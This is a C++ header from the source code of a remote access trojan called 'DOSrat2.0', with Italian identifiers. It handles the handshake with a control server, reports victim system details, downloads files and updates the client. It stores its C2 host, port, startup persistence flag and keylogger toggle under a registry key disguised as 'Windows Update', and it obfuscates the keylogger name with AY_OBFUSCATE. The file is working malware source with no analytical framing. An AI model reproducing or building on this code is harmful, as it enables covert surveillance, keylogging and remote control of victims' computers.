#pragma once

class COMUNICAZIONI
{
private:
	static void TerminaConnessione(SOCKET Sock)
	{
		TcpIP::SetTimeout(0, Sock);
		closesocket(Sock);
	}

public:
	struct NewClient
	{
		string Str;
		json j;
	};

	static bool Inizializzazione(SOCKET Sock)
	{
		DirUtils du;
		SystemUtils su;
		EasyMSGB msgb;

		char Pass[10] = "DOSrat2.0";

		TcpIP::SetTimeout(10000, Sock);

		if (send(Sock, Pass, sizeof(Pass), 0) == SOCKET_ERROR)
		{
			TerminaConnessione(Sock);
			return false;
		}
		if (recv(Sock, Pass, sizeof(Pass), 0) == SOCKET_ERROR)
		{
			TerminaConnessione(Sock);
			return false;
		}
		if ((string)Pass != "DOSrat2.0")
		{
			TerminaConnessione(Sock);
			return false;
		}

		TcpIP::SetTimeout(0, Sock);
		json data;

		data["InstallPath"] = du.GetFullModuleFilePath();
		data["OS"] = su.GetOS();
		data["PCname"] = su.GetPCName();
		data["UAC"] = (su.CheckUAC()) ? "Admin" : "User";
		data["UserName"] = su.GetCurrentUser();
		data["Versione"] = Version;
		data["VersioneCompatibile"] = VersioneCompatibile;

		TcpIP::SendString(Sock, data.dump());

		return true;
	}

	static bool GetInfo(SOCKET Sock, string Str)
	{
		if (TcpIP::SendString(Sock, Str))
			return true;

		return false;
	}

	static bool InvertMouse(SOCKET Sock, bool MouseStatus)
	{
		if (MouseStatus)
		{
			if (TcpIP::SendString(Sock, "a"))
				return true;
		}
		else
			if (TcpIP::SendString(Sock, "b"))
				return true;

		return false;
	}

	static NewClient UpdateClient(SOCKET Sock)
	{
		string Buff;
		NewClient NC;

		if (TcpIP::RecvString(Sock, Buff))
		{
			NC.Str = Buff;

			if (TcpIP::RecvString(Sock, Buff))
			{
				NC.j = json::parse(Buff);
				TcpIP::SendString(Sock, "OK");
			}
			else
				TcpIP::SendString(Sock, "NO");
		}
		else
			TcpIP::SendString(Sock, "NO");

		return NC;
	}
	
	static string PingPong(SOCKET Sock, string Res)
	{
		string Buff = "";
		
		if (!TcpIP::SendString(Sock, Res))
			return "";
		
		if (!TcpIP::RecvString(Sock, Buff))
			return "";

		return Buff;
	}

	static bool DownloadFileWithLoading(SOCKET Sock, string& FileName, string& FileContent)
	{
		string strFileSize;
		string Buff = "";

		if (!TcpIP::RecvString(Sock, FileName))
			return false;

		if (!TcpIP::RecvString(Sock, strFileSize))
			return false;

		int FileSize = stoi(strFileSize);

		if (FileSize > 100)
		{
			int ChunkSize = FileSize / 100;
			int ChunkNumber = FileSize / ChunkSize;

			for (int i = 0; i < ChunkNumber; i++)
			{
				if (!TcpIP::RecvString(Sock, Buff))
					return false;

				FileContent += Buff;
				Buff.clear();
			}
		}
		else
		{
			if (!TcpIP::RecvString(Sock, FileContent))
				return false;

		}

		return true;
	}
};

// Classe per la gestione dei settaggi
class Settaggi
{
private:
	DirUtils du;
	SettingsFile sf;
	RegUtils ru;
	Encode en;

public:
	string Host = "127.0.0.1";
	int Porta = 5555;
	string InstallPath = "C:\\Users\\<User>\\AppData\\Local\\Temp";
	string ExeName = "Client.exe";
	bool RegStartup = true;
	bool KeyLogger = true;
	string InstallDate = "";

	// Costruttore
	Settaggi()
	{
		sf.SetFileName(du.GetModuleFilePath() + "Sett");
		sf.HideFileContent(sf.Hex);
	}

	// Popola i settaggi ottenendoli dal relativo file
	void GetSettingsFromExe()
	{
		string FileName = du.GetModuleFilePath() + "Sett";
		string BinaryFileContent = du.GetBinaryFileContent(du.GetFullModuleFilePath());
		string FileContent = SimpleFind(BinaryFileContent, en.AsciiToHex("{START}"), en.AsciiToHex("{END}"));

		du.WriteFile(FileName, FileContent);

		Host = sf.GetSetting("Host");
		Porta = stoi(sf.GetSetting("Port"));
		InstallPath = sf.GetSetting("InstallPath");
		ExeName = sf.GetSetting("ExeName");
		RegStartup = (sf.GetSetting("RegStartup") == "true");
		KeyLogger = (sf.GetSetting((string)AY_OBFUSCATE("KeyLogger")) == "true");

		/*Host = "127.0.0.1";
		Porta = 6969;
		InstallPath = "C:\\Users\\<User>\\AppData\\Local\\Temp";
		ExeName = "Boiade.exe";
		RegStartup = true;
		KeyLogger = false;*/

		du.DelFile(du.GetModuleFilePath() + "Sett");
	}

	// Popola i settaggi ottenendoli dal registro
	void GetSettingsFromReg()
	{
		Host = en.HexToAscii(ru.RegRead("SOFTWARE\\Windows Update", en.AsciiToHex("Host").c_str(), REG_SZ));
		Porta = stoi(en.HexToAscii(ru.RegRead("SOFTWARE\\Windows Update", en.AsciiToHex("Port").c_str(), REG_SZ)));
		ExeName = en.HexToAscii(ru.RegRead("SOFTWARE\\Windows Update", en.AsciiToHex("ExeName").c_str(), REG_SZ));
		RegStartup = (en.HexToAscii(ru.RegRead("SOFTWARE\\Windows Update", en.AsciiToHex("RegStartup").c_str(), REG_SZ)) == "true");
		KeyLogger = (en.HexToAscii(ru.RegRead("SOFTWARE\\Windows Update", en.AsciiToHex((string)AY_OBFUSCATE("KeyLogger")).c_str(), REG_SZ)) == "true");
		InstallDate = en.HexToAscii(ru.RegRead("SOFTWARE\\Windows Update", en.AsciiToHex("InstallDate").c_str(), REG_SZ));
	}

	// Scrive i settaggi su registro
	void InstallSettings()
	{
		GetSettingsFromExe();

		ru.RegMakeKey("SOFTWARE\\Windows Update");

		ru.RegWrite("SOFTWARE\\Windows Update", en.AsciiToHex("Host").c_str(), REG_SZ, en.AsciiToHex(Host).c_str());
		ru.RegWrite("SOFTWARE\\Windows Update", en.AsciiToHex("Port").c_str(), REG_SZ, en.AsciiToHex(to_string(Porta)).c_str());
		ru.RegWrite("SOFTWARE\\Windows Update", en.AsciiToHex("ExeName").c_str(), REG_SZ, en.AsciiToHex(ExeName).c_str());
		ru.RegWrite("SOFTWARE\\Windows Update", en.AsciiToHex("RegStartup").c_str(), REG_SZ, en.AsciiToHex((RegStartup) ? "true" : "false").c_str());
		ru.RegWrite("SOFTWARE\\Windows Update", en.AsciiToHex((string)AY_OBFUSCATE("KeyLogger")).c_str(), REG_SZ, en.AsciiToHex((KeyLogger) ? "true" : "false").c_str());
		ru.RegWrite("SOFTWARE\\Windows Update", en.AsciiToHex("InstallDate").c_str(), REG_SZ, en.AsciiToHex(DateTime::GetDateTime('_', '/')).c_str());
	}
};